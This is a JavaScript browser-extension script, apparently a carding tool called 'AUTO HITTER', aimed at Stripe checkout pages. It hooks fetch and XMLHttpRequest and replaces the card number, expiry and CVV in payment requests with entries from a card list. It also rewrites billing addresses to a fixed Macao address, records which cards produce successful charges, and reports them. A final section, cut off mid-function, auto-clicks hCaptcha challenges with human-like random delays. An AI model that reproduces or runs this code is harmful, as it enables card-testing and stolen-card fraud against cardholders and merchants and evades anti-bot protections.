// ===================================
// AUTO HITTER - Stripe interception
// payment_methods + payment_pages/confirm (real site error from confirm response)
// ===================================

(function () {
  'use strict';
  if (window.__ARIES_AUTOHIT__) return;
  window.__ARIES_AUTOHIT__ = true;

  let state = { autoHitActive: false, cardList: [], currentIndex: 0, attemptCount: 0, pendingCard: null, lastTriedCard: null, hitSent: false };

  // Helper functions for persistent card storage
  function savePendingCard(card) {
    try {
      if (card) {
        sessionStorage.setItem('ariesxhit_pending_card', card);
        console.log('[CardStorage] Saved pending card to sessionStorage');
      }
    } catch (e) {
      console.error('[CardStorage] Failed to save pending card:', e);
    }
  }

  function getPendingCard() {
    try {
      const card = sessionStorage.getItem('ariesxhit_pending_card');
      return card || null;
    } catch (e) {
      console.error('[CardStorage] Failed to get pending card:', e);
      return null;
    }
  }

  function clearPendingCard() {
    try {
      sessionStorage.removeItem('ariesxhit_pending_card');
      console.log('[CardStorage] Cleared pending card from sessionStorage');
    } catch (e) {
      console.error('[CardStorage] Failed to clear pending card:', e);
    }
  }

  // Load pending card on initialization
  state.pendingCard = getPendingCard();

  // Load last tried card
  try {
    state.lastTriedCard = sessionStorage.getItem('ariesxhit_last_card') || null;
  } catch (e) {
    console.error('[CardStorage] Failed to load last card:', e);
  }

  const STRIPE_PM = 'api.stripe.com/v1/payment_methods';
  const STRIPE_CONFIRM = 'api.stripe.com/v1/payment_pages';
  const STRIPE_PI = 'api.stripe.com/v1/payment_intents';

  function isPaymentMethods(url) {
    return url && url.includes(STRIPE_PM) && !url.includes('payment_intents');
  }

  const STRIPE_SETUP = 'api.stripe.com/v1/setup_intents';
  function isConfirmUrl(url) {
    return url && ((url.includes(STRIPE_CONFIRM) && url.includes('/confirm')) || (url.includes(STRIPE_SETUP) && /\/setup_intents\/[^/]+\/confirm/.test(url)));
  }
  function isVerifyChallengeUrl(url) {
    if (!url) return false;
    if (url.includes(STRIPE_SETUP) && /\/setup_intents\/[^/]+\/verify_challenge/.test(url)) return true;
    if (url.includes(STRIPE_PI) && /\/payment_intents\/pi_[^/]+\/verify_challenge/.test(url)) return true;
    return false;
  }
  function isSetupIntentsUrl(url) {
    return url && url.includes(STRIPE_SETUP) && /\/setup_intents\/seti_/.test(url) && !/\/verify_challenge/.test(url);
  }

  function isPaymentIntentsUrl(url) {
    return url && url.includes(STRIPE_PI) && /\/payment_intents\/pi_/.test(url);
  }

  function tryExtractAmount() {
    try {
      // Check document title first (sometimes amounts are in titles)
      const title = document.title || '';
      console.log('[tryExtractAmount] Checking document title:', title);

      // Check meta tags for pricing info
      const metaTags = document.querySelectorAll('meta[name], meta[property]');
      for (const meta of metaTags) {
        const content = meta.content || '';
        if (content.includes('$') || content.includes('price') || content.includes('amount')) {
          console.log('[tryExtractAmount] Found meta content:', content);
        }
      }

      // Get all text content
      const txt = (document.body && document.body.innerText) || '';
      const allText = title + ' ' + txt;

      console.log('[tryExtractAmount] Searching text length:', allText.length);

      // Try multiple patterns to find amounts (ordered by specificity)
      const patterns = [
        // Specific Stripe/Commerce patterns
        /total[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // "Total: $123.45"
        /amount[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // "Amount: $123.45"
        /price[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,   // "Price: $123.45"
        /pay[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,     // "Pay: $123.45"

        // General currency patterns
        /[\$€£](\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,  // $123.45, €123.45, £123.45
        /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*(usd|eur|gbp|cad|aud)/i,  // 123.45 USD

        // Fallback patterns
        /\b(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\b/g,  // Any number that looks like currency
      ];

      for (const pattern of patterns) {
        const matches = allText.match(pattern);
        if (matches) {
          for (const match of matches) {
            // Clean up the amount
            let amount = match.replace(/[^\d.]/g, '');
            const numAmount = parseFloat(amount);
            if (numAmount > 0 && numAmount < 10000) { // Reasonable amount range
              console.log('[tryExtractAmount] Found amount:', numAmount, 'from pattern:', pattern, 'original:', match);
              return '$' + numAmount.toFixed(2);
            }
          }
        }
      }

      console.log('[tryExtractAmount] No amount found in page content');
      return '';
    } catch (e) {
      console.error('[tryExtractAmount] Error:', e);
      return '';
    }
  }

  function extractCheckoutUrl() {
    // Try to extract checkout URL from various sources
    const currentUrl = typeof location !== 'undefined' ? location.href : '';

    console.log('[extractCheckoutUrl] Current URL:', currentUrl);
    console.log('[extractCheckoutUrl] Document referrer:', document?.referrer);

    // 1. Check if we're already on a checkout URL
    if (currentUrl.includes('checkout.stripe.com') && /\/c\/pay\//.test(currentUrl)) {
      console.log('[extractCheckoutUrl] Found checkout URL in current location');
      return currentUrl.split('#')[0]; // Remove fragment
    }

    // 2. Try to extract from referrer parameter in Stripe controller URLs
    try {
      const url = new URL(currentUrl);
      console.log('[extractCheckoutUrl] URL params:', Array.from(url.searchParams.entries()));

      const referrer = url.searchParams.get('referrer');
      if (referrer) {
        const decodedReferrer = decodeURIComponent(referrer);
        console.log('[extractCheckoutUrl] Decoded referrer:', decodedReferrer);
        if (decodedReferrer.includes('checkout.stripe.com') && /\/c\/pay\//.test(decodedReferrer)) {
          console.log('[extractCheckoutUrl] Found checkout URL in referrer param');
          return decodedReferrer.split('#')[0]; // Remove fragment
        }
      }

      // Check for other possible parameters that might contain checkout URLs
      for (const [key, value] of url.searchParams.entries()) {
        const decoded = decodeURIComponent(value);
        // Check if this parameter value contains a checkout URL
        if (decoded.includes('checkout.stripe.com') && /\/c\/pay\//.test(decoded)) {
          console.log('[extractCheckoutUrl] Found checkout URL in param:', key, decoded);
          return decoded.split('#')[0];
        }
        // Also check if the parameter name suggests it might contain a URL
        if (key.toLowerCase().includes('url') || key.toLowerCase().includes('referrer') ||
            key.toLowerCase().includes('redirect') || key.toLowerCase().includes('return')) {
          if (decoded.includes('checkout.stripe.com') && /\/c\/pay\//.test(decoded)) {
            console.log('[extractCheckoutUrl] Found checkout URL in URL-related param:', key);
            return decoded.split('#')[0];
          }
        }
      }
    } catch (e) {
      console.error('[extractCheckoutUrl] Error parsing current URL:', e);
    }

    // 2.5. Try to extract from URL path or hash that might contain session info
    try {
      // Check if URL contains session information that could point to checkout
      if (currentUrl.includes('billing.stripe.com') && currentUrl.includes('/p/session/')) {
        // This might be a billing page with session info - try to construct checkout URL
        const sessionMatch = currentUrl.match(/\/p\/session\/([^/?#]+)/);
        if (sessionMatch) {
          const sessionId = sessionMatch[1];
          // Try common checkout URL patterns based on session ID
          const possibleCheckoutUrl = `https://checkout.stripe.com/c/pay/${sessionId}`;
          console.log('[extractCheckoutUrl] Attempting to construct checkout URL from session:', possibleCheckoutUrl);
          return possibleCheckoutUrl;
        }
      }
    } catch (e) {
      console.error('[extractCheckoutUrl] Error extracting from session info:', e);
    }

    // 3. Check document.referrer
    if (typeof document !== 'undefined' && document.referrer) {
      const referrer = document.referrer;
      console.log('[extractCheckoutUrl] Checking document.referrer:', referrer);
      if (referrer.includes('checkout.stripe.com') && /\/c\/pay\//.test(referrer)) {
        console.log('[extractCheckoutUrl] Found checkout URL in document.referrer');
        return referrer.split('#')[0]; // Remove fragment
      }
    }

    // 4. Try to find checkout URLs in page content (more thorough search)
    try {
      if (typeof document !== 'undefined') {
        // Check all links for checkout URLs
        const links = document.querySelectorAll('a[href*="checkout.stripe.com"]');
        for (const link of links) {
          const href = link.href;
          if (href.includes('checkout.stripe.com') && /\/c\/pay\//.test(href)) {
            console.log('[extractCheckoutUrl] Found checkout URL in page link:', href);
            return href.split('#')[0];
          }
        }

        // Check form actions
        const forms = document.querySelectorAll('form[action*="checkout.stripe.com"]');
        for (const form of forms) {
          const action = form.action;
          if (action.includes('checkout.stripe.com') && /\/c\/pay\//.test(action)) {
            console.log('[extractCheckoutUrl] Found checkout URL in form action:', action);
            return action.split('#')[0];
          }
        }

        // Check script content for checkout URLs
        const scripts = document.querySelectorAll('script');
        for (const script of scripts) {
          const content = script.textContent || script.innerText || '';
          const checkoutMatches = content.match(/https?:\/\/[^"'\s]*checkout\.stripe\.com[^"'\s]*\/c\/pay\/[^"'\s]*/g);
          if (checkoutMatches) {
            for (const match of checkoutMatches) {
              console.log('[extractCheckoutUrl] Found checkout URL in script content:', match);
              return match.split('#')[0];
            }
          }
        }

        // Check all text content on page for checkout URLs
        const allText = document.body ? document.body.innerText : '';
        const textMatches = allText.match(/https?:\/\/[^"'\s]*checkout\.stripe\.com[^"'\s]*\/c\/pay\/[^"'\s]*/g);
        if (textMatches) {
          for (const match of textMatches) {
            console.log('[extractCheckoutUrl] Found checkout URL in page text:', match);
            return match.split('#')[0];
          }
        }

        // Check meta tags for canonical or redirect URLs
        const metaTags = document.querySelectorAll('meta[content*="checkout.stripe.com"]');
        for (const meta of metaTags) {
          const content = meta.content;
          if (content.includes('checkout.stripe.com') && /\/c\/pay\//.test(content)) {
            console.log('[extractCheckoutUrl] Found checkout URL in meta tag:', content);
            return content.split('#')[0];
          }
        }

        // Check for URLs in data attributes
        const elements = document.querySelectorAll('[data-url], [data-href], [data-link]');
        for (const element of elements) {
          const url = element.dataset.url || element.dataset.href || element.dataset.link;
          if (url && url.includes('checkout.stripe.com') && /\/c\/pay\//.test(url)) {
            console.log('[extractCheckoutUrl] Found checkout URL in data attribute:', url);
            return url.split('#')[0];
          }
        }
      }
    } catch (e) {
      console.error('[extractCheckoutUrl] Error searching page content:', e);
    }

    // 5. Check localStorage and sessionStorage for checkout URLs
    try {
      if (typeof localStorage !== 'undefined') {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          const value = localStorage.getItem(key);
          if (value && typeof value === 'string' && value.includes('checkout.stripe.com') && /\/c\/pay\//.test(value)) {
            console.log('[extractCheckoutUrl] Found checkout URL in localStorage:', key, value);
            return value.split('#')[0];
          }
        }
      }
      if (typeof sessionStorage !== 'undefined') {
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          const value = sessionStorage.getItem(key);
          if (value && typeof value === 'string' && value.includes('checkout.stripe.com') && /\/c\/pay\//.test(value)) {
            console.log('[extractCheckoutUrl] Found checkout URL in sessionStorage:', key, value);
            return value.split('#')[0];
          }
        }
      }
    } catch (e) {
      console.error('[extractCheckoutUrl] Error checking storage:', e);
    }

    // 6. Check global window variables for checkout URLs
    try {
      if (typeof window !== 'undefined') {
        const windowKeys = Object.keys(window);
        for (const key of windowKeys) {
          try {
            const value = window[key];
            if (value && typeof value === 'string' && value.includes('checkout.stripe.com') && /\/c\/pay\//.test(value)) {
              console.log('[extractCheckoutUrl] Found checkout URL in window variable:', key, value);
              return value.split('#')[0];
            }
          } catch (e) {}
        }
      }
    } catch (e) {
      console.error('[extractCheckoutUrl] Error checking window variables:', e);
    }

    // 6. Use stored URL if available
    if (state.originalCheckoutUrl) {
      console.log('[extractCheckoutUrl] Using stored checkout URL:', state.originalCheckoutUrl);
      return state.originalCheckoutUrl;
    }

    console.log('[extractCheckoutUrl] No checkout URL found, using current URL as fallback');
    // 7. Fallback to current URL
    return currentUrl;
  }

  function sendHitOnce(card) {
    if (state.hitSent) return;
    state.hitSent = true;
    const checkoutUrl = extractCheckoutUrl();
    const amount = tryExtractAmount();
    console.log('[sendHitOnce] Sending hit with card:', card, 'amount:', amount);
    send('CARD_HIT', {
      card,
      amount,
    });
  }
  function send(type, data) {
    try {
      if (typeof chrome !== 'undefined' && chrome.runtime?.sendMessage) {
        chrome.runtime.sendMessage({ type, ...data });
      } else {
        window.postMessage({ __ariesxhit__: true, type, ...data }, '*');
      }
    } catch (_) {
      window.postMessage({ __ariesxhit__: true, type, ...data }, '*');
    }
  }

  function getNextCard() {
    if (!state.cardList?.length) return null;
    state.hitSent = false;
    const card = state.cardList[state.currentIndex % state.cardList.length];
    state.currentIndex++;
    if (typeof card === 'string') {
      const [n, m, y, cvv] = card.split('|');
      return { number: n, month: m || '12', year: (y || '28').slice(-2), cvv: cvv || '123' };
    }
    return card;
  }

  const MACAO_BILLING = { country: 'MO', line1: '152 Forest Avenue', city: '', state: '', postal_code: '' };
  function getBilling() {
    try {
      const b = window.__ax_billing;
      if (b && b.line1) return { country: b.country || 'MO', line1: b.line1, city: b.city || '', state: b.state || '', postal_code: b.postal_code || '' };
    } catch (_) {}
    return MACAO_BILLING;
  }

  function replaceBillingInBody(bodyStr) {
    const B = getBilling();
    if (!bodyStr) return bodyStr;
    let r = bodyStr;
    const MO = 'MO';
    const line1 = B.line1 || '152 Forest Avenue';
    const line1Enc = encodeURIComponent(line1);
    // billing_details (payment_methods) - match ddddddd format
    r = r.replace(/billing_details%5Baddress%5D%5Bcountry%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bcountry%5D=${MO}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bline1%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bline1%5D=${line1Enc}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bcity%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bcity%5D=${encodeURIComponent(B.city || '')}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bpostal_code%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bpostal_code%5D=${encodeURIComponent(B.postal_code || '')}`);
    r = r.replace(/billing_details%5Baddress%5D%5Bstate%5D=[^&]*/gi, `billing_details%5Baddress%5D%5Bstate%5D=${encodeURIComponent(B.state || '')}`);
    r = r.replace(/billing_details\[address\]\[country\]=[^&]*/gi, `billing_details[address][country]=${MO}`);
    r = r.replace(/billing_details\[address\]\[line1\]=[^&]*/gi, `billing_details[address][line1]=${line1Enc}`);
    r = r.replace(/billing_details\[address\]\[city\]=[^&]*/gi, `billing_details[address][city]=${encodeURIComponent(B.city || '')}`);
    r = r.replace(/billing_details\[address\]\[postal_code\]=[^&]*/gi, `billing_details[address][postal_code]=${B.postal_code || ''}`);
    r = r.replace(/billing_details\[address\]\[state\]=[^&]*/gi, `billing_details[address][state]=${B.state || ''}`);
    // payment_method_data (setup_intents/confirm, payment_pages) - match aaa format
    r = r.replace(/payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=[^&]*/gi, `payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=${MO}`);
    r = r.replace(/payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=[^&]*/gi, `payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=${line1Enc}`);
    r = r.replace(/payment_method_data\[billing_details\]\[address\]\[country\]=[^&]*/gi, `payment_method_data[billing_details][address][country]=${MO}`);
    r = r.replace(/payment_method_data\[billing_details\]\[address\]\[line1\]=[^&]*/gi, `payment_method_data[billing_details][address][line1]=${line1Enc}`);
    return r;
  }

  function replaceCardInBody(bodyStr, card) {
    if (!bodyStr || !card) return bodyStr;
    let r = bodyStr;
    const num = encodeURIComponent(card.number);
    const mon = encodeURIComponent(card.month);
    const yr = encodeURIComponent(card.year);
    const cv = encodeURIComponent(card.cvv);
    r = r.replace(/card%5Bnumber%5D=[^&]*/g, `card%5Bnumber%5D=${num}`);
    r = r.replace(/card%5Bexp_month%5D=[^&]*/g, `card%5Bexp_month%5D=${mon}`);
    r = r.replace(/card%5Bexp_year%5D=[^&]*/g, `card%5Bexp_year%5D=${yr}`);
    r = r.replace(/card%5Bcvc%5D=[^&]*/g, `card%5Bcvc%5D=${cv}`);
    r = r.replace(/card\[number\]=[^&]*/g, `card[number]=${card.number}`);
    r = r.replace(/card\[exp_month\]=[^&]*/g, `card[exp_month]=${card.month}`);
    r = r.replace(/card\[exp_year\]=[^&]*/g, `card[exp_year]=${card.year}`);
    r = r.replace(/card\[cvc\]=[^&]*/g, `card[cvc]=${card.cvv}`);
    // payment_method_data[card][*] (setup_intents/confirm, aaa format)
    r = r.replace(/payment_method_data%5Bcard%5D%5Bnumber%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bnumber%5D=${num}`);
    r = r.replace(/payment_method_data%5Bcard%5D%5Bexp_month%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bexp_month%5D=${mon}`);
    r = r.replace(/payment_method_data%5Bcard%5D%5Bexp_year%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bexp_year%5D=${yr}`);
    r = r.replace(/payment_method_data%5Bcard%5D%5Bcvc%5D=[^&]*/g, `payment_method_data%5Bcard%5D%5Bcvc%5D=${cv}`);
    r = r.replace(/payment_method_data\[card\]\[number\]=[^&]*/g, `payment_method_data[card][number]=${card.number}`);
    r = r.replace(/payment_method_data\[card\]\[exp_month\]=[^&]*/g, `payment_method_data[card][exp_month]=${card.month}`);
    r = r.replace(/payment_method_data\[card\]\[exp_year\]=[^&]*/g, `payment_method_data[card][exp_year]=${card.year}`);
    r = r.replace(/payment_method_data\[card\]\[cvc\]=[^&]*/g, `payment_method_data[card][cvc]=${card.cvv}`);
    return r;
  }

  function bodyToString(b) {
    if (!b) return '';
    if (typeof b === 'string') return b;
    if (b instanceof URLSearchParams) return b.toString();
    if (b instanceof FormData) {
      const p = new URLSearchParams();
      b.forEach((v, k) => p.append(k, v));
      return p.toString();
    }
    if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
    try {
      return JSON.stringify(b);
    } catch (_) {
      return '';
    }
  }

  function parseResponse(text) {
    try {
      return JSON.parse(text);
    } catch (_) {
      return null;
    }
  }

  const origFetch = window.fetch;
  window.fetch = async function (input, init) {
    let url = typeof input === 'string' ? input : input?.url;
    const method = init?.method || input?.method || 'GET';
    let body = init?.body ?? input?.body;

    if (isPaymentMethods(url) && state.autoHitActive && method === 'POST') {
      const bodyStr = bodyToString(body);
      const card = getNextCard();
      if (card && bodyStr) {
        state.attemptCount++;
        const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
        state.lastTriedCard = cardStr;
        try {
          sessionStorage.setItem('ariesxhit_last_card', cardStr);
        } catch (e) {
          console.error('[CardStorage] Failed to save last card:', e);
        }
        send('CARD_TRYING', { attempt: state.attemptCount, card: cardStr });
        let newBody = replaceCardInBody(bodyStr, card);
        newBody = replaceBillingInBody(newBody);
        const opts = { ...(init || {}), method, body: newBody };
        if (init?.headers) opts.headers = init.headers;
        const res = await origFetch.call(window, url, opts);
        const clone = res.clone();
        clone.text().then((text) => {
          const data = parseResponse(text);
          if (data?.error?.code) {
            const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code;
            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
          } else if (data?.id && String(data.id).startsWith('pm_') && !data?.error) {
            state.pendingCard = cardStr;
            savePendingCard(cardStr);
          }
        });
        return res;
      }
    }
    if (isConfirmUrl(url) && state.autoHitActive && method === 'POST') {
      const res = await origFetch.call(window, input, init);
      const clone = res.clone();
      clone.text().then((text) => {
        const data = parseResponse(text);
        const card = state.pendingCard || getPendingCard();
        if (data?.error) {
          state.pendingCard = null;
clearPendingCard();
          const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code || 'declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
        } else if (card && !data?.error) {
          const status = data?.payment_intent?.status || data?.status;
          const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
          if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
            state.pendingCard = null;
clearPendingCard();
            console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
          }
        }
      });
      return res;
    }
    if (isPaymentIntentsUrl(url) && state.autoHitActive && method === 'GET') {
      const res = await origFetch.call(window, input, init);
      res.clone().text().then((text) => {
        const data = parseResponse(text);
        if (!data) return;
        const status = data.status;
        const lastErr = data.last_payment_error;
        const card = state.pendingCard || getPendingCard();
        if (status === 'succeeded' && card) {
          state.pendingCard = null;
clearPendingCard();
          console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
        } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
          state.pendingCard = null;
clearPendingCard();
          const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: lastErr.message || decline_code, card });
        }
      });
      return res;
    }
    if (isVerifyChallengeUrl(url) && state.autoHitActive && method === 'POST') {
      const res = await origFetch.call(window, input, init);
      res.clone().text().then((text) => {
        const data = parseResponse(text);
        if (!data) return;
        const err = data.last_setup_error || data.last_payment_error;
        if (err && (err.decline_code || err.code)) {
          state.pendingCard = null;
clearPendingCard();
          const decline_code = err.decline_code || err.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
        } else if (data.status === 'succeeded' && !err) {
          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
          state.pendingCard = null;
clearPendingCard();
          console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
        }
      });
      return res;
    }
    if (isSetupIntentsUrl(url) && state.autoHitActive && (method === 'GET' || method === 'POST')) {
      const res = await origFetch.call(window, input, init);
      res.clone().text().then((text) => {
        const data = parseResponse(text);
        if (!data || data.object !== 'setup_intent') return;
        if (data.status === 'succeeded' && !data.last_setup_error) {
          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
          state.pendingCard = null;
clearPendingCard();
          console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
        }
      });
      return res;
    }
    if (input instanceof Request) return origFetch.call(window, input, init);
    return origFetch.call(window, url, init || {});
  };

  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url) {
    this._url = url;
    this._method = method;
    return origOpen.apply(this, arguments);
  };
  const origSendXHR = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (body) {
    const url = this._url;
    const method = this._method;
    if (isConfirmUrl(url) && state.autoHitActive && method === 'POST') {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        const card = state.pendingCard || getPendingCard();
        if (data?.error) {
          state.pendingCard = null;
clearPendingCard();
          const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code || 'declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
        } else if (card && !data?.error) {
          const status = data?.payment_intent?.status || data?.status;
          const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
          if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
            state.pendingCard = null;
clearPendingCard();
            console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
          }
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isPaymentIntentsUrl(url) && state.autoHitActive && method === 'GET') {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        if (!data) return;
        const status = data.status;
        const lastErr = data.last_payment_error;
        const card = state.pendingCard || getPendingCard();
        if (status === 'succeeded' && card) {
          state.pendingCard = null;
clearPendingCard();
          console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
        } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
          state.pendingCard = null;
clearPendingCard();
          const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: lastErr.message || decline_code, card });
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isVerifyChallengeUrl(url) && state.autoHitActive && method === 'POST') {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        if (!data) return;
        const err = data.last_setup_error || data.last_payment_error;
        if (err && (err.decline_code || err.code)) {
          state.pendingCard = null;
clearPendingCard();
          const decline_code = err.decline_code || err.code || 'card_declined';
          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
        } else if (data.status === 'succeeded' && !err) {
          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
          state.pendingCard = null;
clearPendingCard();
          console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isSetupIntentsUrl(url) && state.autoHitActive && (method === 'GET' || method === 'POST')) {
      this.addEventListener('load', function () {
        const data = parseResponse(this.responseText);
        if (!data || data.object !== 'setup_intent') return;
        if (data.status === 'succeeded' && !data.last_setup_error) {
          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
          state.pendingCard = null;
clearPendingCard();
          console.log('[HIT] Sending hit notification with card:', card);
sendHitOnce(card);
        }
      });
      return origSendXHR.apply(this, arguments);
    }
    if (isPaymentMethods(url) && state.autoHitActive && method === 'POST') {
      const bodyStr = bodyToString(body);
      const card = getNextCard();
      if (card && bodyStr) {
        state.attemptCount++;
        const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
        state.lastTriedCard = cardStr;
        try {
          sessionStorage.setItem('ariesxhit_last_card', cardStr);
        } catch (e) {
          console.error('[CardStorage] Failed to save last card:', e);
        }
        send('CARD_TRYING', { attempt: state.attemptCount, card: cardStr });
        let newBody = replaceCardInBody(bodyStr, card);
        newBody = replaceBillingInBody(newBody);
        this.addEventListener('load', function () {
          const data = parseResponse(this.responseText);
          if (data?.error?.code) {
            const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code;
            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
          } else if (data?.id && String(data.id).startsWith('pm_') && !data?.error) {
            state.pendingCard = cardStr;
          }
        });
        return origSendXHR.call(this, newBody);
      }
    }
    return origSendXHR.apply(this, arguments);
  };

  // ===================================
  // HCAPTCHA AUTO-CLICKER
  // Automatically clicks hCaptcha checkboxes when they appear
  // ===================================

  function setupHCaptchaAutoClicker() {
    // hCaptcha auto-clicker is always enabled (configurable via background script)
    console.log('[HCaptcha] Setting up auto-clicker...');
    initHCaptchaObserver();
  }

  function initHCaptchaObserver() {
    console.log('[HCaptcha] Initializing observer...');

    // Monitor for hCaptcha elements
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.type === 'childList') {
          // Check for new hCaptcha elements
          checkForHCaptcha();
        }
      }
    });

    // Start observing
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

    // Also check periodically
    setInterval(checkForHCaptcha, 1000);

    // Initial check
    checkForHCaptcha();
  }

  function checkForHCaptcha() {
    try {
      // Look for hCaptcha checkbox elements
      const hCaptchaSelectors = [
        'div[role="checkbox"][aria-labelledby*="aiy_label"]',
        '.h-captcha div[role="checkbox"]',
        'iframe[src*="hcaptcha.com"]',
        'iframe[title*="hcaptcha" i]',
        'iframe[title*="HCaptcha" i]',
        '.hcaptcha-box',
        '[data-sitekey]',
        '.challenge-container',
        '#HCaptcha-root iframe',
        '.HCaptcha-container iframe'
      ];

      let foundHCaptcha = false;

      for (const selector of hCaptchaSelectors) {
        const elements = document.querySelectorAll(selector);
        if (elements.length > 0) {
          console.log('[HCaptcha] Found hCaptcha elements:', elements.length, 'with selector:', selector);
          foundHCaptcha = true;

          // Try to find and click the checkbox
          for (const element of elements) {
            if (selector.includes('iframe')) {
              // Handle iframe case - focus iframe and send keyboard event
              try {
                console.log('[HCaptcha] Found hCaptcha iframe, attempting activation...');
                activateHCaptchaIframe(element);
              } catch (e) {
                console.log('[HCaptcha] Could not activate iframe:', e.message);
              }
            } else {
              // Direct element
              if (element.getAttribute('role') === 'checkbox' && element.getAttribute('aria-checked') !== 'true') {
                console.log('[HCaptcha] Found unchecked checkbox, attempting click...');
                clickHCaptchaCheckbox(element);
              }
            }
          }
          break; // Found elements, no need to check other selectors
        }
      }

      if (!foundHCaptcha) {
        // Look for other hCaptcha indicators
        const hCaptchaIndicators = document.querySelectorAll('[class*="hcaptcha"], [id*="hcaptcha"], [class*="captcha"]');
        if (hCaptchaIndicators.length > 0) {
          console.log('[HCaptcha] Found potential hCaptcha indicators:', hCaptchaIndicators.length);
        }
      }

    } catch (e) {
      console.error('[HCaptcha] Error in checkForHCaptcha:', e);
    }
  }

  function activateHCaptchaIframe(iframe) {
    try {
      console.log('[HCaptcha] Attempting to activate iframe...');

      // Add random delay to seem more human-like
      const delay = Math.random() * 1000 + 500; // 500-1500ms
      setTimeout(() => {
        try {
          // Focus the iframe
          iframe.focus();

          // Send keyboard events to activate (spacebar or enter)
          const keyEvents = [
            new KeyboardEvent('keydown', { key: ' ', keyCode: 32, bubbles: true }),
            new KeyboardEvent('keyup', { key: ' ', keyCode: 32, bubbles: true })
          ];

          for (const event of keyEvents) {
            iframe.dispatchEvent(event);
          }

          // Also try clicking on the iframe
          const clickEvent = new MouseEvent('click', {
            view: window,
            bubbles: true,
            cancelable: true,
            clientX: iframe.getBoundingClientRect().left + iframe.offsetWidth / 2,
            clientY: iframe.getBoundingClientRect().top + iframe.offsetHeight / 2,
            button: 0,
            buttons: 1
          });
          iframe.dispatchEvent(clickEvent);

          console.log('[HCaptcha] Iframe activation events dispatched');

          // Check if it worked after a delay
          setTimeout(() => {
            // Try to detect if captcha is completed by checking for changes
            console.log('[HCaptcha] Checking if iframe activation worked...');
